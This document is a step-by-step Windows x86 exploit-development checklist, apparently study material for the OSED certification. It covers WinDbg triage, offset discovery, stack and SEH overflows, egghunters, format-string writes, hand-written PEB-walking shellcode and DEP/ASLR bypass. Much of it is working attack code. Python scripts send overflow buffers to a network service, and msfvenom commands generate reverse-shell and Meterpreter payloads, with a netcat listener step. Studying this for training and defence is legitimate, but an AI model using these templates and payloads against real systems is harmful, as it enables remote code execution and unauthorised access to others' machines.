  • Operator-checklist methodology for Windows user-mode exploit development. Each phase walks the exploit-dev lifecycle end-to-end: triage the target, find the bug, control execution, bypass mitigations, deliver shellcode.

1.1 Reconnaissance & Setup

  • Stand up your debugging environment, analyse the target binary, and prepare your toolchain before writing a single byte of exploit code.

1.1.1 Environment Setup

  • Configure WinDbg with Microsoft symbol server:
    • .sympath srv*C:\symbols*https://msdl.microsoft.com/download/symbols
    • .reload /f — force symbol download for all loaded modules
    • Verify symbols loaded: lm should show (pdb symbols) next to each module
  • Load the pykd extension for scripting:
    • .load pykd
    • Test with !py C:\Tools\test.py — confirm output appears in WinDbg console
    • pykd API: pykd.reg("eip"), pykd.loadDWords(addr, count), pykd.loadBytes(addr, count)
# WinDbg initial setup sequence
.sympath srv*C:\symbols*https://msdl.microsoft.com/download/symbols
.reload /f
.load pykd
lm                          # verify all modules show (pdb symbols)
!py C:\Tools\test.py        # verify pykd loads
  • Snapshot the debugging VM before each exploit attempt:
    • Match the target OS build (Windows 10/11, Server 2019/2022) to the engagement
    • Disable automatic updates to pin the binary version
    • Take a clean snapshot with WinDbg attached and symbols loaded
  • Set up the exploit development directory:
    • Create workspace: mkdir exploit && cd exploit
    • Skeleton exploit script in Python with import socket, struct
    • Keep a notes file mapping offsets, bad chars, and gadget addresses

1.1.2 Target Analysis

  • Identify the target binary and its loaded modules:
    • lm — list all modules with base addresses and ASLR/SafeSEH flags
    • lm m targetapp — get base address of the target module
    • x kernel32!Virtual* — symbol lookup with wildcards
  • Identify input vectors and protocol:
    • Network service: identify listening port, protocol (TCP/UDP), message format
    • File parser: identify supported file formats, magic bytes, header structure
    • Hook network input: bp ws2_32!recv or bp ws2_32!WSARecv
  • Map the attack surface in the binary:
    • Search for dangerous functions: x targetapp!*strcpy*, x targetapp!*sprintf*, x targetapp!*memcpy*
    • Check import table for unsafe APIs: !dh targetapp -f
    • Note the calling convention (stdcall vs cdecl) — affects stack cleanup and offset calc
# Target analysis — modules and input vectors
lm                              # list all loaded modules with base addresses
lm m targetapp                  # get base address of target module
x kernel32!Virtual*             # wildcard symbol lookup
x targetapp!*strcpy*            # find dangerous functions in target
x targetapp!*sprintf*
x targetapp!*memcpy*

bp kernel32!ReadFile            # break on file read

# Check PE header info
!dh targetapp -f                # display PE headers and import table

  • Opcode lookup:

1.2 Reverse Engineering

  • Combine static and dynamic analysis to find the vulnerability. Start in IDA, confirm in WinDbg.

1.2.1 IDA Pro Static Analysis

  • Start from the Imports window and trace data flow inward:
    • Look for network input functions: recv, WSARecv, ReadFile, fread
    • Press X on each import to list cross-references (callers)
    • Follow the call chain upward until you find the parsing function
  • Audit the parsing function for unsafe patterns:
    • Search for strcpy, strcat, sprintf, memcpy / CopyMemory calls
    • Check if the length argument comes from attacker-controlled input
    • Check if the destination buffer is stack-allocated (local variable) vs heap
  • Use the decompiler to understand complex logic:
    • Press F5 for Hex-Rays pseudocode on complex functions
    • Rename variables and functions as you understand them: sub_401234 → parse_header
    • Annotate loop bounds, buffer sizes, and branch conditions
  • Calculate the address mapping for runtime use:
    • IDA imagebase is usually 0x00400000 or 0x10000000
    • Runtime address = module_base_at_runtime + (IDA_addr - IDA_imagebase)
    • Verify with lm m targetapp in WinDbg to get runtime base

1.2.2 WinDbg Dynamic Analysis

  • Hook network receive to observe incoming data:
    • bp ws2_32!recv "dd esp L8; g" — log recv arguments and continue
    • bp ws2_32!recv "da poi(esp+8) L?400; g" — dump received buffer as ASCII
    • Run the target, send test input, observe buffer contents in debugger output
# Hook recv() to dump incoming data and continue automatically
bp ws2_32!recv "da poi(esp+8) L?400; g"

# Hook recv() showing all 4 arguments (socket, buf, len, flags)
bp ws2_32!recv "dd esp L8; g"

# Address mapping: IDA static address → WinDbg runtime address
# runtime_addr = module_base_at_runtime + (IDA_addr - IDA_imagebase)
# Example: IDA shows vuln at 0x00401234, imagebase 0x00400000, lm shows base 0x10000000
# runtime = 0x10000000 + (0x00401234 - 0x00400000) = 0x10001234
  • Set breakpoints on suspected vulnerable functions:
    • bp targetapp!parse_header — break at the function entry
    • bp 0x00401234 — break at a specific address (from IDA analysis)
    • Step through with p (step-over) and t (trace-into)
    • Use pt to run to the next return instruction
  • Inspect memory and registers at the crash point:
    • r — display all registers
    • db esp L100 — display 256 bytes at ESP
    • dd esp L20 — display 32 DWORDs at ESP
    • dds esp L20 — DWORDs with symbol resolution (useful for ROP)
    • !address eip — check page permissions at EIP
  • Use hardware breakpoints for data watchpoints:
    • ba w4 0x0012fc00 — break on 4-byte write to address (catch the overwrite)
    • ba e1 0x004015c0 — break on execute at address

# Log all calls to strcpy with source string
bp msvcrt!strcpy "da poi(esp+8); g"

# Breakpoint with register check
bp targetapp+0x5678 ".if (@eax == 0) {.echo EAX IS ZERO} .else {g}"

# Trace function calls in a module
wt -l 3 -oR                    # watch trace 3 levels deep with return values

1.2.3 Protocol Reverse Engineering

  • Capture and analyse raw protocol traffic:
    • Hook ws2_32!recv and dump every received buffer
    • Identify header structure: magic bytes, length fields, type fields, checksums
    • Map which header fields control parsing behaviour (dispatch tables)
  • Reimplement the protocol in Python:
    • Build a minimal client that can send valid protocol messages
    • Reimplement any checksum or length-prefix calculation
    • Use struct.pack("<I", value) for little-endian DWORD fields
  • Identify the overflow trigger in the protocol:
    • Vary each field independently: which one causes the crash?
    • Length fields that control a copy size are prime targets
    • String fields copied via strcpy / strcat without bounds checking
import socket, struct

def build_packet(opcode, payload):
    """Reimplement target protocol — adjust header fields to match RE findings."""
    header  = b"\x41\x42"                          # magic bytes (from RE)
    header += struct.pack("<H", opcode)             # message type (little-endian)
    header += struct.pack("<I", len(payload))       # payload length
    # Add checksum if the protocol requires it
    # checksum = sum(payload) & 0xFFFF
    # header += struct.pack("<H", checksum)
    return header + payload

# Send a valid protocol message
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("[ip]", [port]))
s.send(build_packet(0x01, b"test"))
resp = s.recv(4096)
print("Response:", resp.hex())
s.close()

# Fuzz the payload length — does the parser trust the length field?
for size in [0x100, 0x200, 0x400, 0x800, 0x1000, 0x2000]:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("[ip]", [port]))
    s.send(build_packet(0x01, b"A" * size))
    s.close()

1.3 Crash Triage & Offset Discovery

  • Reproduce the crash, identify the overwrite type, and pinpoint the exact offset to the control field (EIP or SEH handler).

1.3.1 Initial Crash

  • Send a large buffer and observe the crash type:
    • Start with A * 2000 or larger depending on expected buffer size
    • Attach WinDbg: File > Attach to Process or windbg -p [pid]
    • Send the payload and wait for the access violation
  • Determine the crash type from the exception:
    • If EIP = 41414141 → direct EIP overwrite (stack BOF)
    • If EIP points to valid code but crash is in an exception handler → SEH overwrite
    • Run !exchain to check the SEH chain for overwritten handlers
  • Note the state at the crash:
    • r — save all register values
    • db esp L100 — what data is on the stack after EIP?
    • !exchain — are SEH handlers overwritten?
    • !address esp — confirm stack is writable
import socket

# Initial crash test — send large buffer of A's
target_ip   = "[ip]"
target_port = [port]
buf_size    = 2000

buf = b"A" * buf_size

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))
s.send(buf)
s.close()

# In WinDbg after crash:
# r               — check EIP (41414141 = direct EIP overwrite)
# !exchain        — check SEH chain for 41414141 (SEH overwrite)
# db esp L100     — examine stack contents
# !address esp    — confirm stack is writable

1.3.2 Offset Calculation

  • Generate and send a cyclic pattern:
    • msf-pattern_create -l 2000 > pattern.txt
    • Send the pattern as the payload instead of A's
    • Wait for the crash in WinDbg
# Generate cyclic pattern and find offset
msf-pattern_create -l 2000 > pattern.txt
# After crash, read EIP value and calculate offset
msf-pattern_offset -l 2000 -q 42306142
# Output: Exact match at offset 780
  • Read the overwritten value and calculate the offset:
    • For EIP overwrite: r eip → note the 4-byte hex value
    • For SEH overwrite: !exchain → note the handler address value
    • msf-pattern_offset -l 2000 -q [hex_value] → exact offset
  • Record both the EIP offset and the nSEH offset if SEH-based:
    • nSEH is always 4 bytes before the SEH handler
    • If SEH offset is N, then nSEH offset is N - 4
    • Document both offsets in your exploit notes

1.4 Bad Characters & Return Address

  • Eliminate every byte that gets mangled in transit, then find a clean return address from a compatible module.

1.4.1 Bad Character Elimination

  • Generate a test array of all bytes 0x01–0xFF:
    • Python: badchars = bytes(range(1, 256))
    • Place after the EIP/SEH overwrite: buf = padding + ret_addr + badchars
    • Null byte (\x00) is always bad — start at 0x01
  • Inspect the buffer in memory for corruption:
    • db esp L100 — walk through the sequence byte by byte
    • Where the sequence breaks or jumps → that byte is bad
    • Common bad chars: \x00 (null), \x0a (LF), \x0d (CR), \x20 (space)
  • Remove confirmed bad chars and repeat:
    • Remove the identified bad byte from the array
    • Re-send and re-inspect — the byte after the removed one may now reveal another bad char
    • Repeat until the full sequence survives intact in memory
# Bad character test array generator
badchars = bytes(range(1, 256))  # 0x01 through 0xFF (skip 0x00)

# Place after the EIP/SEH overwrite point
buf  = b"A" * OFFSET
buf += b"B" * 4               # placeholder return address
buf += badchars                # inspect this in memory

# In WinDbg after crash:
# db esp L100  — walk byte by byte, where the sequence breaks = bad char
# Remove the bad char, regenerate, re-send, repeat until clean
  • Alternative: use mona for automated comparison:
    • !py mona bytearray -b "\x00" — generate reference file
    • !py mona compare -f C:\mona\bytearray.bin -a esp — compare memory vs reference

1.4.2 Module Selection

  • List all loaded modules and their protections:
    • lm — list modules with base addresses
    • !py mona modules — shows ASLR, SafeSEH, Rebase, NXCompat per module
  • Pick a module that lacks all mitigations:
    • No ASLR (base address is static across reboots)
    • No SafeSEH (for SEH-based exploits — allows arbitrary handler addresses)
    • No Rebase
    • Ideally NXCompat = False (no DEP) for stack-based shellcode execution
  • Verify the module base is constant:
    • Run lm m [module] across multiple reboots
    • If the base changes → ASLR is active, pick a different module

1.5 Stack Buffer Overflow Exploitation

  • Assemble the exploit payload: padding → return address → NOP sled → shellcode. Adapt the layout for direct EIP overwrite vs SEH-based overwrite.

1.5.1 Classic Stack BOF

  • Build the exploit buffer layout:
    • Layout: padding + JMP_ESP + NOP_sled + shellcode
    • Padding: b"A" * offset
    • Return address: struct.pack("<I", 0x10090c83) — JMP ESP from non-ASLR module
    • NOP sled: b"\x90" * 16 — landing zone
  • Generate shellcode with msfvenom:
    • msfvenom -p windows/shell_reverse_tcp LHOST=[ip] LPORT=443 -f python -v shellcode -b "\x00\x0a\x0d"
    • For staged: msfvenom -p windows/meterpreter/reverse_tcp ...
    • For x64: msfvenom -p windows/x64/shell_reverse_tcp ...
    • Add encoder: -e x86/shikata_ga_nai for polymorphic encoding
# Generate shellcode — adjust bad chars per target
msfvenom -p windows/shell_reverse_tcp LHOST=[ip] LPORT=443 \
  -f python -v shellcode -e x86/shikata_ga_nai -b "\x00\x0a\x0d"

# For staged Meterpreter:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=443 \
  -f python -v shellcode -b "\x00\x0a\x0d"
import socket, struct

OFFSET  = 780
JMP_ESP = struct.pack("<I", 0x10090c83)  # JMP ESP from non-ASLR module

# msfvenom output pasted here
shellcode = b""
shellcode += b"\xdb\xc0\xd9\x74\x24\xf4..."  # truncated

buf  = b"A" * OFFSET          # padding to saved EIP
buf += JMP_ESP                 # overwrite EIP → JMP ESP
buf += b"\x90" * 16           # NOP sled (landing zone)
buf += shellcode               # reverse shell payload

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("[ip]", [port]))
s.send(buf)
s.close()
  • Assemble and send the final exploit:
    • buf = b"A" * OFFSET + JMP_ESP + b"\x90" * 16 + shellcode
    • Start a listener before sending: nc -lvnp 443
    • Send the buffer to the target service
    • Confirm shell callback and run whoami

1.5.2 SEH-Based Overflow

  • Confirm SEH chain is overwritten:
    • !exchain — should show your controlled values in the handler chain
    • nSEH is at offset N, SEH handler is at offset N + 4
  • Set nSEH to a short forward jump:
    • nseh = b"\xeb\x06\x90\x90" — short JMP +6 to skip over the 4-byte SEH field
    • After POP/POP/RET executes, control lands on nSEH, which jumps forward into shellcode
  • Set SEH handler to POP/POP/RET gadget:
    • Find with !py mona seh -b "\x00\x0a\x0d"
    • Manual search: s -[1]b 0 L?80000000 5? 5? c3 (POP r32 / POP r32 / RET)
    • Must come from a module with SafeSEH disabled
import struct

OFFSET = 3500
nseh   = b"\xeb\x06\x90\x90"                    # short JMP +6 over SEH field
PPR    = struct.pack("<I", 0x10015ffe)           # POP/POP/RET from SafeSEH=False module

buf  = b"A" * OFFSET           # padding to nSEH
buf += nseh                     # nSEH: short jump forward
buf += PPR                      # SEH handler: POP/POP/RET
buf += b"\x90" * 16            # NOP sled
buf += shellcode                # reverse shell payload

# Flow: crash → SEH dispatch → POP/POP/RET → lands on nSEH → JMP +6 → NOPs → shellcode
  • Build the full SEH exploit:
    • buf = b"A" * OFFSET + nseh + struct.pack("<I", PPR) + b"\x90" * 16 + shellcode

1.5.3 Island Hopping

  • When shellcode space is split across non-contiguous buffer regions:
    • Map all locations where your input lands in memory
    • Use s -a 0 L?80000000 "AAAA" to find all copies of your buffer
  • Chain jumps between buffer islands:
    • Short JMP: \xeb\xNN — ±127 bytes relative, 2 bytes total
    • Near JMP: \xe9 + signed 4-byte offset — ±2GB range, 5 bytes total
    • Calculate the offset: target_addr - (current_addr + jmp_instruction_size)
  • Use a staged approach for complex layouts:
    • Stage 1: short jump from nSEH/EIP area to first island
    • Stage 2: near jump from first island to the largest contiguous region
    • Stage 3: full shellcode in the largest region
  • General references: Corelan Stack BOF · Corelan SEH · FuzzySecurity Exploit Dev

1.6 Space-Constrained Exploitation

  • When the available buffer after the overwrite is too small for shellcode (<400 bytes), use an egghunter or jump backward to a larger region.

1.6.1 Egghunter (NtAccessCheck)

  • Understand the egghunter mechanism:
    • ~32 bytes — fits in the smallest buffer space
    • Uses syscall 0x02 (NtAccessCheckAndAuditAlarm) to safely probe memory pages
    • Skips inaccessible pages without crashing, scans for the egg tag
  • Set the egg tag:
    • EGG = b"w00tw00t" — 8-byte tag (repeated 4-byte pattern)
    • Prepend the tag to your full shellcode placed elsewhere in memory
    • The tag must be unique — w00t repeated ensures uniqueness vs the scanner code itself
  • Build the egghunter with Keystone:
    • Assemble the NtAccessCheck egghunter using Keystone from Python
    • Verify assembled bytes are null-free and contain no bad chars
    • Place egghunter at the small buffer, full shellcode (with egg tag) at the large buffer

1.7.1 PEB Walk & Module Resolution

1.7.2 Export Address Table Resolution

  • Parse the PE headers to find the Export Directory:
    • PE_signature = [kernel32_base + 0x3C] — e_lfanew offset
    • Export_Dir = [kernel32_base + PE_sig + 0x78] — DataDirectory[0] RVA
    • Add kernel32 base to get absolute address of Export Directory
  • Walk the export tables:
    • NumberOfNames = [ExportDir + 0x18] — total named exports
    • AddressOfFunctions = [ExportDir + 0x1C] — array of function RVAs
    • AddressOfNames = [ExportDir + 0x20] — array of name string RVAs
    • AddressOfNameOrdinals = [ExportDir + 0x24] — ordinal mapping array
  • Use ROR-13 hash comparison for compact name matching:
    • Pre-compute hashes: LoadLibraryA, GetProcAddress, VirtualAlloc, WinExec
    • Loop through AddressOfNames, hash each name with ROR-13, compare to target
    • On match: use ordinal to index into AddressOfFunctions → function address

; Input:  EAX = module base address, ECX = target ROR-13 hash

    mov eax, [ebp+0x3C]           ; e_lfanew → PE signature offset

    mov esi, [ebx+ecx*4]          ; name string RVA
    add esi, ebp                  ; name string absolute

    xor eax, eax

    ror edi, 0x0D                  ; rotate right 13 bits

1.8 DEP Bypass with ROP

  • When Data Execution Prevention is active, build a Return-Oriented Programming chain to call VirtualAlloc (or WriteProcessMemory) and make your shellcode executable.

    • !address esp confirms the stack region lacks execute permission
  • Check system-wide DEP policy:
    • bcdedit /enum | findstr nx — OptIn / OptOut / AlwaysOn

    • AlwaysOn = all processes (requires ROP or WriteProcessMemory bypass)

1.8.2 Gadget Discovery

  • Scan target modules for usable gadgets:

  • Load the VirtualAlloc parameters into registers:

1.9 ASLR Bypass

  • Address Space Layout Randomization moves module bases each reboot. Bypass it by using non-ASLR modules, leaking a pointer, or doing a partial overwrite.

1.9.1 Non-ASLR Module Exploitation

  • Find modules compiled without ASLR:
    • !py mona modules — look for ASLR = False in the output table
    • lm across multiple reboots — if base doesn’t change, ASLR is off
    • Third-party DLLs, older modules, and plugin DLLs often lack ASLR
  • Use all gadgets and addresses from the non-ASLR module:
    • JMP ESP, POP/POP/RET, ROP gadgets — all from the same static-base module
    • Address bytes must still avoid bad characters
    • If the only non-ASLR module is small, you may need to combine with another technique

1.9.2 Information Leak

  • Leak a runtime pointer from the application:
    • Format string vulnerability: read stack values that contain code pointers
    • Over-read vulnerability: read past a buffer boundary to expose adjacent pointers
    • Error messages that include memory addresses (verbose debug output)
  • Calculate module base from the leaked pointer:
    • module_base = leaked_addr - known_offset_in_module
    • Known offset = address in IDA minus IDA imagebase

1.10 Format String Attacks

  • Format string vulnerabilities provide both read and write primitives. Use them to leak information, bypass ASLR, and write arbitrary values to control execution.

1.10.1 Detection & Read Primitives

  • Confirm the format string vulnerability:
    • Send %x %x %x %x %x %x %x %x as input
    • If the server reflects hex stack values → vulnerable
    • If it prints literal %x → not vulnerable (proper format string handling)
  • Read arbitrary memory with direct parameter access:
    • %N$x — read the N-th DWORD from the stack as hex
    • %N$p — read as pointer (with 0x prefix)
    • %N$s — dereference the N-th DWORD as a pointer and read the string it points to

1.10.2 Write Primitives

  • Understand the write specifiers:
    • %n — writes 4 bytes (number of chars printed so far) to the address pointed to by the argument
    • %hn — writes 2 bytes (lower half)
    • %hhn — writes 1 byte (lowest byte)
    • Use %hn for most exploits — two 2-byte writes to compose a full DWORD
  • Build a 4-byte write with two %hn writes:
    • Place two target addresses on the stack: target_addr and target_addr+2
    • Calculate padding: pad_lo = low_word - bytes_already_printed and pad_hi = high_word - low_word
    • Format string: [addr_lo][addr_hi]%[pad_lo]x%[off1]$hn%[pad_hi]x%[off2]$hn
import struct

def write_dword(target_addr, value, input_offset):
    """Build a format string that writes a 4-byte value using two %hn writes."""
    lo = value & 0xFFFF                # low 2 bytes
    hi = (value >> 16) & 0xFFFF       # high 2 bytes

    # Addresses placed at the start of the format string (8 bytes = 2 DWORDs)
    addr_lo = struct.pack("<I", target_addr)       # write low half here
    addr_hi = struct.pack("<I", target_addr + 2)   # write high half here

    # Write smaller value first, then larger
    if lo <= hi:
        pad1 = lo - 8                    # subtract bytes already printed (2 addresses = 8)
        pad2 = hi - lo
        fmt = addr_lo + addr_hi
        fmt += f"%{pad1}x%{input_offset}$hn".encode()
        fmt += f"%{pad2}x%{input_offset+1}$hn".encode()
    else:
        pad1 = hi - 8
        pad2 = lo - hi
        fmt = addr_hi + addr_lo
        fmt += f"%{pad1}x%{input_offset}$hn".encode()
        fmt += f"%{pad2}x%{input_offset+1}$hn".encode()

    return fmt
  • Handle integer wraparound:
    • If the high word is smaller than the low word, add 0x10000 to the high word calculation
    • Always write the smaller value first, then the larger value
    • Test the write by targeting a visible memory location first

1.10.3 Full Exploitation Chain

  • Step 1: Leak to bypass ASLR:
    • Use %N$x to read code pointers from the stack
    • Calculate module base from the leaked value
    • Calculate saved-EIP address and gadget addresses
  • Step 2: Write the ROP chain start address over saved EIP:
    • Use %hn to write the low 2 bytes of the ROP gadget address to saved EIP
    • Use another %hn to write the high 2 bytes to saved EIP + 2
    • Alternatively: write a stack pivot gadget address (xchg eax, esp; ret)
  • Step 3: Trigger the return and execute the ROP chain:
    • When the vulnerable function returns, EIP = your written address
    • ROP chain calls VirtualAlloc or WriteProcessMemory
    • Shellcode executes with RWX permissions → reverse shell
  • Stack pivot alternative for complex chains:
    • Gadgets: xchg eax, esp; ret, add esp, 0x200; ret, lea esp, [eax+N]; ret
    • Pivot the stack to a controlled buffer where the full ROP chain is laid out
    • Find pivot gadgets: s -b 0 L?80000000 94 c3 (XCHG EAX, ESP; RET)

2. x86 Architecture

  • 32-bit x86 is the entire OSED scope
  • Need memory layout, register set, calling conventions, and a small instruction vocabulary
  • Required to read disassembly, reason about overflows, and write shellcode

2.1 Program Memory Layout

  • Text segment: executable code (read+execute only)
  • Data/BSS: globals/statics (initialized and uninitialized)
  • Heap: dynamic allocations, grows upward
  • Stack: locals, saved frame pointers, return addresses, function arguments — grows downward from high to low addresses

2.2 CPU Registers

  • Hijacking EIP is the entire point of exploitation
  • Other registers shape how you get there and what your shellcode can do
RegisterRole in Exploitation
EIPInstruction pointer — address of next instruction; hijacking this = code execution
ESPStack pointer (top of stack, lowest addr); shellcode lives here after overflow
EBPFrame base pointer; offset arithmetic used to find EIP offset
EAXAccumulator; holds return values; ROP gadget for API argument passing
EBX / ECX / EDXGeneral purpose; ECX often loop counter, EDX I/O; used in ROP chains
ESI / EDISource/destination index; egghunter uses ESI/EDI to scan memory
EFLAGSZF, CF, OF drive conditional jumps in shellcode and ROP chains

2.3 The Stack & Calling Conventions

  • Stack grows high → low; PUSH decrements ESP by 4, POP increments ESP by 4
  • stdcall (Win32 APIs): args pushed right-to-left, callee cleans stack with RETN N
  • cdecl (C runtime): caller cleans via ADD ESP, N after the call
  • CALL pushes the return address; RET pops it back into EIP — that’s the value a stack overflow overwrites
  • All values are little-endian: address 0x10090c83 is stored as \x83\x0c\x09\x10

2.4 Common Instructions

xor  eax, eax        ; eax = 0  (null-byte-free zeroing)

6. SEH-Based Overflows

  • Overflow tramples a stack-resident exception registration record instead of a saved return address
  • Exploit by overwriting the handler pointer so the exception dispatcher transfers control to your gadget

6.1 Structured Exception Handling Theory

  • Windows maintains a singly-linked list of exception registration records on the stack
  • Each record: nSEH (pointer to next record) and SEH (pointer to handler function)
  • On exception, OS dispatcher walks this chain, calling each handler
  • Large overflow can overwrite a record; the overflow itself triggers an access violation
  • SafeSEH checks a per-module exception handler table
  • SEHOP verifies the chain terminates at a known sentinel

6.2 Bypassing SafeSEH / SEHOP

  • Source POP/POP/RET gadget from a module compiled without SafeSEH (SafeSEH=False in mona)
  • For SEHOP: ensure the chain still terminates correctly
  • Windows 7 is largely silent; Windows 10 is more restrictive — find a module without SEHOP enforcement

6.3 Exploitation Steps

  • Overflow to overwrite the SEH record — triggers an access violation
  • Set SEH (handler) to a POP r32 / POP r32 / RET gadget from a SafeSEH-free module
  • Two POPs skip the dispatcher’s extra items; RET returns into nSEH
  • Set nSEH to a short jump forward (\xeb\x06\x90\x90 = JMP +6) to hop over SEH field into shellcode
  • Find offset to SEH record with cyclic pattern; confirm with !exchain
# After crash: inspect the SEH chain to confirm your overwrite
!exchain
# Should show: 0xXXXXXXXX: invalid (your pattern value) -> that is the SEH handler

# Find a POP POP RET in a SafeSEH-free module

7.6 Protocol Reverse Engineering Workflow

# Re-implement a reversed checksum in Python (example: additive XOR checksum)
def calc_checksum(data: bytes) -> int:
    cksum = 0
    for b in data:
        cksum = ((cksum << 1) | (cksum >> 31)) & 0xFFFFFFFF  # ROL 1
        cksum ^= b
    return cksum & 0xFF

def build_packet(opcode: int, payload: bytes) -> bytes:
    header_len = 0x10
    total_len  = header_len + len(payload)
    pkt  = b"\x01\x00"               # magic
    pkt += opcode.to_bytes(2, "little")
    pkt += total_len.to_bytes(4, "little")
    pkt += b"\x00" * 4               # reserved
    pkt += calc_checksum(pkt[:12]).to_bytes(4, "little")
    pkt += payload
    return pkt

8.6 SEH-Based Egghunter (Portable)

  • Basic syscall egghunter can fault on certain Windows versions
  • SEH-based variant installs a local exception handler to catch access violations during scan
  • Portable from Windows XP through Windows 10
SEH_EGGHUNTER_ASM = """
    start:
        jmp  get_seh_address     ; jump to get the SEH handler address
    egghunter:
        pop  ecx                 ; pop SEH address into ECX
        mov  [ecx+0x4], ecx     ; install SEH handler (store addr in record)
        or   ecx, 0xfff          ; ECX -> top of current page
    next_addr:
        inc  ecx                 ; advance to next byte
        lea  eax, [ecx+0x4]     ; EAX = address in next page
        xchg eax, esp            ; swap SEH frame pointer with stack
        sub  esp, 0x208          ; reserve SEH frame space
    try_access:
        mov  eax, 0x74303077    ; "w00t"
        cmp  dword ptr [ecx], eax   ; check for first egg half
        jne  next_addr
        cmp  dword ptr [ecx+4], eax ; check for second egg half
        jne  next_addr
    found_shellcode:
        jmp  ecx                 ; jump into shellcode after the egg
    get_seh_address:
        call egghunter           ; push EIP (SEH address), jump back
"""

9. Creating Custom Shellcode

  • Encoders can’t always avoid every bad character or fit a tight space
  • Alternative: hand-written shellcode that resolves Win32 APIs at runtime from the PEB
  • Portable across Windows versions, free of hardcoded addresses

9.1 The System Call Problem

  • Cannot hardcode syscall numbers in portable shellcode — they differ between Windows versions
  • Instead, resolve Win32 API addresses at runtime: PEB → Ldr → module list → PE Export Address Table

9.2 Finding kernel32.dll via the PEB

  • Read PEB at fs:[0x30], follow PEB->Ldr at offset 0x0C
  • Walk InMemoryOrderModuleList at +0x14 to find kernel32’s DllBase
  • On Windows 7/10 the order is ntdll → app → kernel32 — walk to third entry, read +0x10 for base
; fs:[0x30] -> PEB
; PEB+0x0C -> PEB_LDR_DATA*
; PEB_LDR_DATA+0x14 -> InMemoryOrderModuleList (doubly-linked, first entry = self)
; Each LIST_ENTRY+0x10 -> DllBase of the module
; Walk to 3rd entry to reach kernel32.dll (ntdll=1st, app=2nd, kernel32=3rd on Win7-10)

find_kernel32:
    mov  eax, fs:[0x30]      ; EAX = PEB
    mov  eax, [eax+0x0C]     ; EAX = PEB->Ldr
    mov  eax, [eax+0x14]     ; EAX = first InMemoryOrderModuleList entry (Flink)
    mov  eax, [eax]          ; EAX = second entry (skip self)
    mov  eax, [eax]          ; EAX = third entry (kernel32 on most targets)
    mov  eax, [eax+0x10]     ; EAX = DllBase of kernel32.dll

9.3 Resolving Symbols via the Export Address Table

  • Parse kernel32’s PE Export Directory to find any exported function by hashing its name
  • Avoids hardcoded addresses and works across patch levels
; Given EAX = kernel32 DllBase:
; PE Header: [EAX+0x3C] -> offset to PE signature
; PE+0x78 -> RVA of Export Directory
; Export Dir+0x18 -> NumberOfNames
; Export Dir+0x1C -> AddressOfFunctions  (EAT: array of RVAs)
; Export Dir+0x20 -> AddressOfNames      (ENT: array of name RVAs)
; Export Dir+0x24 -> AddressOfNameOrdinals (EOT: name->ordinal mapping)

find_function:
    ; EBP = DllBase, ECX = target hash
    mov  edx, [ebp+0x3C]        ; RVA of PE header
    mov  edx, [ebp+edx+0x78]    ; RVA of Export Directory
    add  edx, ebp                ; VA of Export Directory
    mov  esi, [edx+0x20]        ; RVA of AddressOfNames
    add  esi, ebp                ; VA of AddressOfNames
    xor  ecx, ecx
next_function_loop:
    inc  ecx
    lodsd                        ; EAX = RVA of next name, ESI advances
    add  eax, ebp                ; VA of function name string
    call compute_hash            ; hash it (see below)
    cmp  eax, [esp+0x28]        ; compare to target hash
    jne  next_function_loop
    ; found: get address from EAT using the ordinal
    mov  esi, [edx+0x24]        ; RVA of AddressOfNameOrdinals
    add  esi, ebp
    mov  cx, [esi+ecx*2-2]     ; ordinal of matched name
    mov  esi, [edx+0x1C]       ; RVA of AddressOfFunctions
    add  esi, ebp
    mov  edx, [esi+ecx*4]      ; RVA of function
    add  edx, ebp               ; VA of function -> EDX
    ret

9.4 Computing Function Name Hashes

  • Pre-compute ROR-13 hash of each function name needed (LoadLibraryA, GetProcAddress, etc.)
  • Bake hash into shellcode — runtime resolver matches hashes instead of strings
  • Keeps the payload small
# Compute the hash used to find a function by name (ROR-13 variant common in shellcode)
import struct

def ror32(val, bits):
    return ((val >> bits) | (val << (32 - bits))) & 0xFFFFFFFF

def hash_name(name: str) -> int:
    h = 0
    for c in name + "\x00":    # include null terminator
        h = ror32(h, 13)
        h = (h + ord(c)) & 0xFFFFFFFF
    return h

# Pre-compute hashes for the functions you need
for fn in ["LoadLibraryA", "GetProcAddress", "VirtualAlloc",
           "WinExec", "WSAStartup", "WSASocket", "WSAConnect", "CreateProcessA"]:
    print(f"  0x{hash_name(fn):08x}  {fn}")

9.5 NULL-Free Position-Independent Code

  • Avoid \x00 in every byte of shellcode (most protocols null-terminate)
  • Replace mov eax, 0x00000001 with xor eax,eax; inc eax
  • Push "calc\x00" null-free: xor ecx,ecx; push ecx then push 0x636c6163
  • Position-independence: CALL/POP “delta” trick — CALL pushes EIP, POP ESI recovers runtime address
; Avoid \x00 bytes in the shellcode (most protocols null-terminate)
; BAD:  mov eax, 0x00000001  ; contains \x00 bytes
; GOOD: xor eax, eax  /  inc eax   ; 0x00000001 without null bytes
; BAD:  push 0x00636c6163 ("calc" with leading null)
; GOOD: xor ecx, ecx  /  push ecx  /  push 0x636c6163  (null terminator first)

; Position-independent: use CALL/POP to get runtime EIP (delta technique)
    call  delta
delta:
    pop   esi                ; ESI = runtime address of 'delta' label
    sub   esi, 5             ; ESI = start of shellcode
    ; Now use [esi + offset_to_data] for all data references

; String "calc" pushed null-free onto the stack:
    xor   ecx, ecx
    push  ecx                ; null terminator
    push  0x636c6163         ; "clac" -> memory is "calc\x00"
    mov   eax, esp           ; EAX -> "calc"

10. Bypassing DEP with ROP

  • DEP marks the stack non-executable — direct shellcode jumps fault
  • ROP chains existing executable code snippets ending in RET to call a Win32 API
  • Makes memory executable, then returns into shellcode

10.1 DEP Theory & Windows Defender Exploit Guard

  • DEP marks all writable memory pages (stack, heap) non-executable
  • Jump to shellcode on the stack faults instead of executing
  • Windows Defender Exploit Guard enforces DEP at the process level
  • Confirm from WinDbg: !vprot esp — PAGE_READWRITE (no execute) means DEP is on
# Confirm DEP status for a process from WinDbg
!vprot esp       # page at ESP should show PAGE_READWRITE (not executable)
# If PAGE_EXECUTE_READWRITE -> DEP is off for this process
# !address esp -> shows "Protect: 4" (RW, no execute) -> DEP is on

10.2 Return-Oriented Programming Origins & Evolution

  • ROP introduced by Hovav Shacham in 2007
  • Chains existing executable code snippets (“gadgets”) ending in RET
